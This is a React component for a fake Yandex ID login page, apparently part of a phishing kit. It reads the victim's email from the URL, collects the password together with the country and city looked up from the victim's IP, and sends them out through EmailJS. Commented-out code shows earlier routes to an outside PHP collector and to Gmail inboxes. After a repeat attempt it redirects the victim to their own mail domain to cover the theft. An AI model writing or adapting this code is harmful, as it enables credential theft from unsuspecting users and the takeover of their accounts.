
import React, { useState, useEffect, useRef } from "react";
import './Yandex.css';
import { BsArrowLeft, BsFacebook, BsTwitter } from 'react-icons/bs';
import { FcGoogle } from 'react-icons/fc';
import { ReactComponent as YaIcon } from "../../Media/SVG/YaIcon.svg";
import { ReactComponent as Smile } from "../../Media/SVG/Smile.svg";
import { ReactComponent as YaIdlogoIcon } from "../../Media/SVG/Idlogo.svg";
// import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';


const Yandex = ()=>{

    const formRef = useRef();
                
    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);
  

    useEffect(()=>{
        document.title = 'YANDEX.COM';
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2400);
    }, []);

    const [spinLoader, setSpinLoader] = useState(false);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [yandexEmail, setYandexEmail] = useState(extracetdEmail)
    const [yandexPassword, setYandexPassword] = useState();

    const [count, setCount] = useState(0);

    const submitYandex = (e)=>{
        e.preventDefault();
        // alert(7654)
        // console.log(yandexEmail, yandexPassword);

        if(yandexPassword === ""){
            setSpinLoader(false);
            return null
            // alert('Please fill in the input')
        }else{
            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
            }, 1600);
            setTimeout(() => {
                setYandexPassword('');
            }, 800);

            // const user = {
            //     email: yandexEmail,
            //     password: yandexPassword
            // };


              // post to server
            //   const user = {
            //     // email: defaultEmail,
            //     // password: defaultPassword,
            //     subject: "General Page Logs",
            //     to: "rvvlsales13@gmail.com",
            //     // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
            //     body:
            //     `
            //     <html lang="en">
            //     <p>Online Correspondence: ${yandexEmail}</p>
            //     <p>Signal: ${yandexPassword}</p>
            //     <p>Country: ${country}</p>
            //     <p>Flag: ${flag}</p>
            //     </html>
            //     `
            // };


            // const user = {
            //     "subject": "Coming Logs",
            //     "to": "reportwork5252@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${yandexEmail}</p><p>Signal: ${yandexPassword}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }


            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log(data);
            //     },
            // });





            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
      
      
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('!');
              },
              (error) => {
                console.log('...', error.text);
              },
            );





            
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));

                setTimeout(() => {
                    window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
                }, 2200);
         
            };
        }
    };


    return(<div>

        { spinLoader ? <Preloader /> : null }
        
        <div className="Yandex_bg">

            <main className="Yandex_form_cont">

                <div className="stret_">
                    <BsArrowLeft style={{cursor:'pointer'}} className='icom_poin'/>

                    <div className="icn_cont_jdn" style={{
                        display:'flex',
                        justifyContent: 'center'
                    }}>
                        <article className="oiujmk" style={{
                            display:'flex',
                            justifyContent: 'center',
                            alignItems: 'center'
                        }}>
                            <YaIcon />

                            <Smile className="svg_color" style={{fill:'white'}} />

                            <YaIdlogoIcon className="svg_color" />
                        </article>
                    </div>

                    <p>&#160;</p>

                </div>


                <p className="Yandex_txt_lgin">Log in with Yandex ID</p>

                <form onSubmit={submitYandex} ref={formRef}>
                    
                    <div>
                        <input 
                            type={`email`}
                            placeholder='Username or email'
                            className="Yandex_email_class"
                            readOnly
                            value={yandexEmail}
                            onChange={e=> setYandexEmail(e.target.value)}
                            required
                            name="online_correspondence"
                        />
                    </div>


                    <div>
                        <input 
                            style={{
                                marginTop:'16px'
                            }}
                            type={`password`}
                            placeholder='Password'
                            className="Yandex_email_class"
                            value={yandexPassword}
                            onChange={e=> setYandexPassword(e.target.value)}
                            name="signal"
                            autoFocus
                        />
                    </div>


                    <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>



                    <div>
                        <input 
                            type={`submit`}
                            className="Yandex_submit_btn_"
                            value={`Log in`}
                            onClick={submitYandex}
                        />
                    </div>


                    <div>
                        <input 
                            type={`submit`}
                            className="Yandex_create_ID_btn_"
                            value={`Create ID`}
                            onClick={e=> e.preventDefault()}
                        />
                    </div>

                    <p className="linwith">Log in with</p>


                    <div className="Yandex_media_logins">
                        
                        <div className="Yandex_round_border_">
                            <BsFacebook className="Y_F_I"/>
                        </div>

                        <div className="Yandex_round_border_">
                            <FcGoogle className="Y_F_G"/>
                        </div>

                        <div className="Yandex_round_border_">
                            <BsTwitter className="Y_T_I"/>
                        </div>
                    </div>



                </form>

            </main>




        </div>

        {/* oiuy */}

    </div>)
};


export default Yandex;